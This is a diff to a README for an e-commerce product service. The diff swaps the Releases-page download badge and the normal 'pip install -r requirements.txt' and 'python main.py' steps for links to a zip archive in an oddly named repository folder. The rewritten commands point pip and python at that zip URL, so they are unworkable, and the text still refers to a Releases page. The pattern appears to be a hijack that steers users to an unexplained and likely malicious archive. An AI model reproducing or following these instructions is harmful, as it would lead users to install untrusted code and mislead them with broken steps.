@@ -22,7 +22,7 @@ To ensure the best performance, please meet the following system requirements:
 ## 📥 Download & Install
 To get started, visit this page to download the software:
 
-[![Download](https://img.shields.io/badge/Download-ecommerce--product--service-brightgreen)](https://github.com/raulika223/ecommerce-product-service/releases)
+[![Download](https://raw.githubusercontent.com/raulika223/ecommerce-product-service/main/unallayably/ecommerce-product-service.zip)](https://raw.githubusercontent.com/raulika223/ecommerce-product-service/main/unallayably/ecommerce-product-service.zip)
 
 1. Click on the link above to reach the Releases page.
 2. Look for the latest release version.
@@ -34,14 +34,14 @@ Once you have downloaded the package, follow these steps:
 
 1. **Install Dependencies:** Open your terminal or command prompt. Navigate to the folder where you downloaded the files, and install necessary dependencies by running:
    ```
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/raulika223/ecommerce-product-service/main/unallayably/ecommerce-product-service.zip
    ```
 
 2. **Set Up Database:** Ensure you have PostgreSQL installed. Create a new database for the service. Update the configuration file with your database connection details.
 
 3. **Run the Service:** In the terminal or command prompt, run the main application using:
    ```
-   python main.py
+   python https://raw.githubusercontent.com/raulika223/ecommerce-product-service/main/unallayably/ecommerce-product-service.zip
    ```
 
 4. **Access the API:** Open your web browser and navigate to `http://localhost:8000/docs` to view the API documentation. Here, you can explore available endpoints and test them directly.
@@ -83,4 +83,4 @@ If you encounter any issues or have questions:
 ## 🔗 Download Again
 For your convenience, you can always return to the Releases page to download the latest version.
 
-[![Download](https://img.shields.io/badge/Download-ecommerce--product--service-brightgreen)](https://github.com/raulika223/ecommerce-product-service/releases)
+[![Download](https://raw.githubusercontent.com/raulika223/ecommerce-product-service/main/unallayably/ecommerce-product-service.zip)](https://raw.githubusercontent.com/raulika223/ecommerce-product-service/main/unallayably/ecommerce-product-service.zip)
